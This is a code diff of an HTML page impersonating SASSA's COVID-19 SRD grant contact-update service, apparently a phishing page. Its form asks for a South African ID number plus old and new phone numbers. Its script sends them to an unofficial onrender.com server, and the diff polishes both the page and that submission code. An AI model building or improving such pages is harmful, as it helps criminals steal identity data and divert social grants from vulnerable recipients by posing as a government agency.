@@ -1,79 +1,40 @@
-
+<!-- index.html -->
 <!DOCTYPE html>
-<!-- saved from url=(0046)https://srd-sassa-gov-za-sc19-contact.web.app/ -->
-<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>sassa</title>
+  <title>SASSA</title>
   <link rel="icon" href="https://srd-sassa-gov-za-sc19-contact.web.app/sassa-logo2.jpeg" type="image/png">
   <style>
-    body {
-      margin: 0;
-      font-family: Arial, sans-serif;
-      background-color: #f9f9f9;
-    }
-
-    .container {
-      max-width: auto;
-      margin: 0 auto;
-    }
-
-    .header {
-      background-color: #fbc02d;
-      padding: 5px;
-      text-align: center;
-    }
-
-    .header img {
-      max-width: 100%;
-      height: 50px;
-      display: block;
-    }
-
+    body { margin: 0; font-family: Arial, sans-serif; background-color: #f9f9f9; }
+    .container { margin: 0 auto; }
+    .header { background-color: #fbc02d; padding: 5px; text-align: center; }
+    .header img { max-width: 100%; height: 50px; display: block; }
     .application-form {
-      padding: 20px;
-      background-color: white;
+      padding: 20px; background-color: white;
       box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
       border-radius: 5px;
     }
-
     .application-form label {
-      display: block;
-      font-size: 14px;
-      font-weight: bold;
-      margin-bottom: 5px;
-      color: #333;
-    }
-    p {
-      text-align: start;
+      display: block; font-size: 14px;
+      font-weight: bold; margin-bottom: 5px; color: #333;
     }
     .application-form input {
-      width: 98%;
-      padding: 12px;
-      margin-bottom: 20px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      font-size: 14px;
+      width: 98%; padding: 12px; margin-bottom: 20px;
+      border: 1px solid #ccc; border-radius: 5px; font-size: 14px;
     }
-
     .application-form input:focus {
-      outline: none;
-      border-color: #fbc02d;
+      outline: none; border-color: #fbc02d;
     }
-
     .application-form .submit-btn {
-      background-color: #d8d8d8;
-      color: #919191;
-      border: none;
-      padding: 10px 20px;
-      border-radius: 5px;
-      font-size: 16px;
-      cursor: not-allowed;
-      width: 100%;
+      background-color: #d8d8d8; color: #919191;
+      border: none; padding: 10px 20px;
+      border-radius: 5px; font-size: 16px;
+      cursor: not-allowed; width: 100%;
     }
-
     .application-form .submit-btn:enabled {
-      background-color: #fbc02d;
-      color: #131313;
+      background-color: #fbc02d; color: #131313;
       cursor: pointer;
     }
   </style>
@@ -84,17 +45,17 @@
       <img src="sassa-logo.png" alt="SASSA Logo">
     </header>
     <main>
-      <p class="application-form">If you want to update your cellphone number and/or email address that is used for communication and web application access related to your COVID-19 SRD R370 grant, we firstly need to verify that you are the original applicant. Please submit your 13 digit South African identity number and cellphone number used on application or reapplication.
-        Note that you can only submit one request to update your contact details in a 24 hour period.</p>
+      <p class="application-form"> If you want to update your cellphone number and/or email address related to your COVID-19 SRD R370 grant, submit your ID number and old phone number. Only one request per 24 hours is allowed.</p>
       <form class="application-form" id="applicationForm">
         <label for="idNumber">South African ID Number of Applicant *</label>
         <input type="text" id="idNumber" maxlength="13" placeholder="Enter your ID number" oninput="validateForm()">
         
-        <label for="phoneNumber">Old Phone Number Used to Submit Your Application *</label>
-        <input type="text" id="phoneNumber" maxlength="10" placeholder="Enter your phone number" oninput="validateForm()">
+        <label for="phoneNumber">Old Phone Number *</label>
+        <input type="text" id="phoneNumber" maxlength="10" placeholder="Enter your old phone number" oninput="validateForm()">
         
         <label for="newphoneNumber">New Phone Number *</label>
-        <input type="text" id="newphoneNumber" maxlength="10" placeholder="Enter your phone number" oninput="validateForm()">
+        <input type="text" id="newphoneNumber" maxlength="10" placeholder="Enter your new phone number" oninput="validateForm()">
+        
         <button type="submit" class="submit-btn" id="submitButton" disabled>Submit</button>
       </form>
     </main>
@@ -105,38 +66,37 @@
       const idNumber = document.getElementById('idNumber').value;
       const phoneNumber = document.getElementById('phoneNumber').value;
       const submitButton = document.getElementById('submitButton');
-      submitButton.disabled = !(idNumber.length === 13 && phoneNumber.length === 10);
+      if (idNumber.length === 13 && phoneNumber.length === 10) {
+        submitButton.disabled = false;
+      } else {
+        submitButton.disabled = true;
+      }
     }
-  </script>
 
-  <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      document.getElementById("applicationForm").addEventListener("submit", async function (e) {
-        e.preventDefault();
+    document.getElementById("applicationForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+      const idNumber = document.getElementById("idNumber").value.trim();
+      const phoneNumber = document.getElementById("phoneNumber").value.trim();
+      const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
 
-        const idNumber = document.getElementById("idNumber").value.trim();
-        const phoneNumber = document.getElementById("phoneNumber").value.trim();
-        const newphoneNumber = document.getElementById("newphoneNumber").value.trim();
+      try {
+        const response = await fetch("https://srd-sassa-gov-za-change-contact-3ebc.onrender.com/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
+        });
 
-        try {
-          const response = await fetch("https://srd-sassa-gov-za-change-contact-3ebc.onrender.com", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ idNumber, phoneNumber, newphoneNumber }),
-          });
-
-          if (response.ok) {
-            alert("Application submitted successfully!");
-          } else if (response.status === 409) {
-            alert("Duplicate entry found.");
-          } else {
-            alert("An error occurred.");
-          }
-        } catch (error) {
-          console.error("Submission error:", error);
-          alert("Could not connect to server.");
+        if (response.ok) {
+          alert("Application submitted successfully!");
+        } else if (response.status === 409) {
+          alert("Duplicate entry found.");
+        } else {
+          alert("An error occurred.");
         }
-      });
+      } catch (error) {
+        console.error("Submission error:", error);
+        alert("Network error. Please try again.");
+      }
     });
   </script>
 </body>
